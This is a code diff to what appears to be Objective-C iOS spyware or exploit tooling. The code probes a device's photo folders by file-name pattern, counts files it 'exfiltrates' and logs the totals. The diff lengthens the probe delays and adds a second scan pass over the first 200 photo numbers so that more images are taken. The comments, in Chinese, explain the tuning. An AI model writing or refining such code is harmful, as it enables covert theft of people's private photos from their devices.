@@ -561,7 +561,7 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
            total:(int *)scannedTotal
 {
     // 覆盖所有来源：相机/截屏 IMG_、编辑版 IMG_E、全景 PANO_；4 位和 5 位编号
-    NSArray<NSNumber *> *delays = @[@0, @5, @10, @20, @30, @50, @80, @120];
+    NSArray<NSNumber *> *delays = @[@0, @5, @10, @20, @30, @50, @80, @120, @200, @300];
     NSArray<NSString *> *prefixes = @[@"IMG_%04d", @"IMG_%05d", @"IMG_E%04d", @"PANO_%04d"];
     NSArray<NSString *> *exts = @[@"HEIC", @"HEIF", @"JPG", @"JPEG", @"PNG",
                                   @"DNG", @"TIF", @"TIFF", @"GIF", @"BMP", @"WEBP"];
@@ -654,6 +654,20 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
             if ((start - 1) % 500 == 0) {
                 [self log:[NSString stringWithFormat:
                     @"%dAPPLE/IMG_%04d... exfil=%d probes=%d", folder, start, exfiled, scanned]];
+            }
+        }
+        // 二次扫描补漏：照片通常集中在前 200 个编号，再扫一遍
+        for (int start = 1; start <= 200; start += 10)
+        {
+            int hits = [self scanChunk:folder
+                                 start:start
+                                 count:10
+                                   tmp:tmp
+                                 decoy:decoyData
+                                 total:&scanned];
+            if (hits > 0) {
+                folderHits += hits;
+                exfiled += hits;
             }
         }
         [self log:[NSString stringWithFormat:
